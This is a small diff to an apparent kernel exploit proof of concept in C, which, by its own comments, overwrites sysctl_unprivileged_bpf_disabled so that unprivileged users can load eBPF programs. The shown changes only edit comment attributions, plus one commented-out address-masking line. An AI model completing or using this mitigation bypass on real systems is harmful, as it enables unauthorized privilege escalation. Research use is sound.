@@ -1,4 +1,4 @@
-// FZY: Add a simple eBPF check bypass proof of concept that overwrites sysctl_unprivileged_bpf_disabled from 2 (unprivileged users are prohibited from loading bpf, and it can be changed to 0 or 1 without rebooting) to 0 (unprivileged users can load eBPF programs)
+// SDP: Add a simple eBPF check bypass proof of concept that overwrites sysctl_unprivileged_bpf_disabled from 2 (unprivileged users are prohibited from loading bpf, and it can be changed to 0 or 1 without rebooting) to 0 (unprivileged users can load eBPF programs)
 
 #include <fcntl.h>
 #include <stdio.h>
@@ -191,7 +191,7 @@ int main(int argc, char *argv[]) {
 
     printf("[+] sysctl_unprivileged_bpf_disabled address from kernel memory: 0x%lx\n", sysctl_unprivileged_bpf_disabled_addr);
 
-    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
+    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
     // sysctl_unprivileged_bpf_disabled_addr = sysctl_unprivileged_bpf_disabled_addr | 0xFFFF000000000000;
   }
   
